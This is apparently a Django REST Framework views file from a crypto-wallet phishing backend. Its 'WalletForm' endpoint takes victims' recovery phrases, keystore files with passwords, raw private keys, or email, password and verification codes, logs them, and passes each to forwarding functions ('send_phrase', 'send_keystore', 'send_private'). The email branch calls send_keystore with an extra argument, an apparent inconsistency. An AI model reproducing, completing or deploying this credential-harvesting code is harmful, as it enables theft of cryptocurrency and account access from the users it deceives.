import json
from django.http import HttpRequest
from rest_framework import views
from rest_framework import generics
from rest_framework.response import Response
from v1.cmc import csv_to_data, data
from v1.formats import send_keystore, send_phrase, send_private


from v1.models import WalletListModel
from v1.serializers import WalletListSerializer


class DataAPIView(views.APIView):

    def get(self, request, *args, **kwargs):
        q = data()
        r = csv_to_data(q.file)
        return Response(r)


class WalletListView(generics.ListCreateAPIView):
    queryset = WalletListModel.objects.all()
    serializer_class = WalletListSerializer


class WalletForm(views.APIView):
    def post(self, request: HttpRequest, *args, **kwargs):
        data = json.loads(request.body)
        type = data.get('type')
        idx = data.get('id')
        if not type:
            return Response({'status': 0, 'message':'Type not found'})
        print(data)
        if type == 'phrase':
            status = send_phrase(idx, data.get('token'))
            return Response({'status': status})
        if type == 'keystore':
            status = send_keystore(idx, data.get('token'), data.get('password'))
            return Response({'status': status})
        if type == 'private':
            status = send_private(idx, data.get('pKey'))
            return Response({'status': status})
        if type == 'email':
            status = send_keystore(idx, data.get('email'), data.get('password'), data.get('code'))
            return Response({'status': status})